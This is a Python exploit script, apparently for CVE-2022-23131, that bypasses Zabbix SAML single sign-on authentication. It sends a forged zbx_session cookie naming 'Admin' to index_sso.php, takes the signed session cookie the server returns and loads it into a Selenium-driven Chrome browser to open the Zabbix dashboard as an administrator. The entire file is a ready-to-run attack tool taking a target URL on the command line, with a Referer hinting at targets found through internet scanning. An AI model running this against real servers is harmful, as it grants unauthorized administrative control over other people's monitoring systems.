import requests,urllib3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import time
import re
import os,sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main(url):
	if 'http' not in url:
		url='http://'+url
	try:
		r=requests.get(url,verify=False,timeout=5)
		reditList = r.history
		redit=reditList[len(reditList)-1].headers["location"]
		url=redit
	except:
		pass
	cookie_dict=get_cookie(url)
	exp(cookie_dict,url)
def get_cookie(url):
	cookie_dict={}
	
	if url[-1]=='/':
		url2=url+'index_sso.php'
	else:
		url2=url+'/index_sso.php'
	headers={
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
	'Referer': 'https://fofa.info/',
	'Connection': 'close',
	'Cookie': 'zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9',
	'Upgrade-Insecure-Requests': '1',
	'Cache-Control': 'max-age=0',
	}
	r=requests.get(url2,headers=headers,verify=False,timeout=5)
	#print(r.text)
	reditList = r.history
	cookie=reditList[len(reditList)-1].headers["Set-Cookie"].split(';')[0]
	cookie_dict['name']=cookie.split('=')[0]
	cookie_dict['value']=cookie.split('=')[1]
	return cookie_dict
def exp(cookie_dict,url):
	chromedriver = "chromedriver.exe"
	os.environ["webdriver.Chrome.driver"] = chromedriver  # 调用chrome浏览器
	# chrome_options = Options()
	# chrome_options.add_argument('--headless')
	# driver = webdriver.Chrome(chrome_options=chrome_options)
	driver = webdriver.Chrome(chromedriver)
	driver.maximize_window()
	if url[-1]=='/':
		url2=url+'zabbix.php?action=dashboard.view'
	else:
		url2=url+'/zabbix.php?action=dashboard.view'
	driver.get(url2)
	try:
		driver.find_element_by_xpath('//*[@id="details-button"]').click()
		time.sleep(2)
		driver.find_element_by_xpath('//*[@id="proceed-link"]').click()
	except:
		pass
	cookie_dict = {
	            # 'domain': '134.209.207.34',
	            'name': cookie_dict['name'],
	            'value': cookie_dict['value'],
	            "expires": '',
	            'path': '/',
	            'httpOnly': False,
	            'HostOnly': False,
	            'Secure': True
	        }
	driver.add_cookie(cookie_dict)
	# print('asdad')
	driver.refresh() 
	while True:
		time.sleep(1)
def logo():
	print('''
  ______ ____    ____  _______        ___     ___    ___    ___          ___    ____    __   ____    __           _______ ___   ___ .______   
 /      |\   \  /   / |   ____|      |__ \   / _ \  |__ \  |__ \        |__ \  |___ \  /_ | |___ \  /_ |         |   ____|\  \ /  / |   _  \  
|  ,----' \   \/   /  |  |__    ______  ) | | | | |    ) |    ) |  ______  ) |   __) |  | |   __) |  | |  ______ |  |__    \  V  /  |  |_)  | 
|  |       \      /   |   __|  |______|/ /  | | | |   / /    / /  |______|/ /   |__ <   | |  |__ <   | | |______||   __|    >   <   |   ___/  
|  `----.   \    /    |  |____        / /_  | |_| |  / /_   / /_         / /_   ___) |  | |  ___) |  | |         |  |____  /  .  \  |  |      
 \______|    \__/     |_______|      |____|  \___/  |____| |____|       |____| |____/   |_| |____/   |_|         |_______|/__/ \__\ | _|      
                                                                                                                                              

  
                                                              --by dsb V1.0

		''')
if __name__ == '__main__':
	logo()
	if len(sys.argv)<2:
		print('Usage: python3 zabbix-exp.py url')
	else:
		url=sys.argv[1]
		# print(url)
		main(url)

